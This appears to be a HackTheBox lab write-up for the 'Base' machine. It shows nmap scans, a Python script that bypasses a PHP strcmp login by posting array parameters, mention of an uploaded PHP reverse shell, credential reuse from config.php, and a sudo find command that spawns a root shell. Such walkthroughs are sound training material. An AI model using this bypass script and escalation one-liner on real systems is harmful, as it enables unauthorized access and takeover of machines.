---
description: Base box from HackTheBox write up.
---

# Base

## Nmap scan

Let's start with a classic `nmap` scan:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -v --min-rate 1000 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 19:21 EDT
Initiating Ping Scan at 19:21
Scanning <MACHINE_IP> [4 ports]
Completed Ping Scan at 19:21, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:21
Completed Parallel DNS resolution of 1 host. at 19:21, 0.00s elapsed
Initiating SYN Stealth Scan at 19:21
Scanning <MACHINE_IP> [65535 ports]
Discovered open port 22/tcp on <MACHINE_IP>
Discovered open port 80/tcp on <MACHINE_IP>
Completed SYN Stealth Scan at 19:21, 16.52s elapsed (65535 total ports)
Nmap scan report for <MACHINE_IP>
Host is up (0.051s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.70 seconds
           Raw packets sent: 65539 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sC -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 19:23 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```

A web server and SSH open. I think we can take a look to the website first.

## Port 80

The page contains a home page and a login page in `http://<MACHINE_IP>/login/login.php`. I decided to use `gobuster` and looks like directory listing is enabled and we can just check the files under `http://<MACHINE_IP>/login/`. Also `gobuster` reported `http://<MACHINE_IP>/_uploaded` and an upload page at `http://<MACHINE_IP>/upload.php` but to access it we need to login first.

The interesting file in `http://<MACHINE_IP>/login/` is `login.php.swp`. This kind of file is used to avoid losing data while editing a document if for some reason the editor crash or whatever. Using `strings` we can get the code that performs the login process in the `login.php` file (More or less, I had to fix it a bit):

```php
<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username , $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

Looking a bit how this works, looks like it is using `strcmp`. If we pass an array as argument instead of a string the `strcmp` function will just return 0, I wrote a little Python script to perform the login bypass and print the session cookie we can use to open the page in the browser:

```python
#! /usr/bin/env python3

import requests

url = 'http://<MACHINE_IP>/login/login.php'
data = {'username[]': ('user'), 'password[]': ('pass')}

session = requests.Session()
session.post(url, data=data)
print(session.cookies.get_dict())
```

Using the cookie the script prints, we can access the upload functionality of the page.

### Foothold

We can just upload a PHP reverse shell and access it in the `/_uploaded/` directory. Now we are in the box!

## In the box as www-data

Well the first thing I wanted to check was the `config.php` file of the web server:

```bash
www-data@base:/var/www/html/login$ cat config.php 
<?php
$username = "admin";
$password = "thisisagoodpassword";
```
After all, a brute force attack could have worked... anyway, looks like there is an user called `john` in the box, using the password we just found we can login as him.

## From john to root

I decided to drop the reverse shell and use a regular SSH session for stability reasons. First of all, the user flag is under `/home/john/user.txt`.

The user is not in the `sudo` group but check this:

```bash
john@base:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find

```

He can execute the command `find` with `sudo`. We can abuse this with:

```bash
john@base:~$ sudo find . -exec /bin/bash \; -quit
root@base:~# 
```

And we are root! The flag is as usual under `/root/root.txt`.
